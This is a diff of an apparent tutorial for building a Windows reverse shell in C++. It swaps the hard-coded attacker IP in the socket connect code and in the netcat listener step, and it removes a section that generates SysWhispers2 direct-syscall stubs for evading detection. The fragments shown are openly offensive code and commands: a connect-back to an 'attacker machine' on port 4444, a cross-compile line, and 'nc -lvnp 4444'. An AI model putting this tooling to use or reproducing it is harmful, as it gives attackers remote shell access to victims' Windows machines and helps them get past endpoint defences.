@@ -65,7 +65,7 @@ int main() {
     // Define server address
     server.sin_family = AF_INET;
     server.sin_port = htons(4444); // Your port
-    server.sin_addr.s_addr = inet_addr("192.168.1.72"); // Your IP
+    server.sin_addr.s_addr = inet_addr("192.168.1.100"); // Your IP
 
     // Connect to server
     if (connect(sock, (SOCKADDR*)&server, sizeof(server)) == SOCKET_ERROR) {
@@ -116,7 +116,7 @@ x86_64-w64-mingw32-g++ reverse_shell.cpp -o reverse_shell.exe -lws2_32 -static-l
 ## Step 4: Running the Reverse Shell
 
 1. **Start a Listener**: 
-   On your attacker machine (IP `192.168.1.72`), start a listener:
+   On your attacker machine (IP `192.168.1.100`), start a listener:
    ```bash
    nc -lvnp 4444
    ```
@@ -143,18 +143,6 @@ Install MinGW-w64 to compile the C++ code:
 ```bash
 sudo apt-get install mingw-w64
 ```
-
-### Cloning and Setting Up SysWhispers2:
-Clone the SysWhispers2 repository:
-```bash
-git clone https://github.com/jthuraisamy/SysWhispers2.git
-cd SysWhispers2
-```
-Generate syscall stubs:
-```bash
-python3 syswhispers.py --functions NtCreateThreadEx,NtClose --out-file syscalls
-```
-This command generates two files: `syscalls.c` and `syscalls.h`. These files contain the necessary syscall stubs that allow us to invoke syscalls directly in our reverse shell code.
 
 ## Step 2: Writing the Reverse Shell Code
 
@@ -184,7 +172,7 @@ int main() {
     // Define server address
     server.sin_family = AF_INET;
     server.sin_port = htons(4444); // Change this to your desired port
-    server.sin_addr.s_addr = inet_addr("192.168.1.72"); // Change this to your attacker's IP
+    server.sin_addr.s_addr = inet_addr("192.168.1.100"); // Change this to your attacker's IP
 
     // Connect to server
     WSAConnect(sock, (SOCKADDR*)&server, sizeof(server), NULL, NULL, NULL, NULL);
@@ -225,7 +213,7 @@ x86_64-w64-mingw32-g++ reverse_shell.cpp -o reverse_shell.exe -lws2_32 -static-l
 ## Step 4: Running the Reverse Shell
 
 1. **Start a Listener**: 
-   On your attacker machine (IP `192.168.1.72`), start a listener:
+   On your attacker machine (IP `192.168.1.100`), start a listener:
    ```bash
    nc -lvnp 4444
    ```
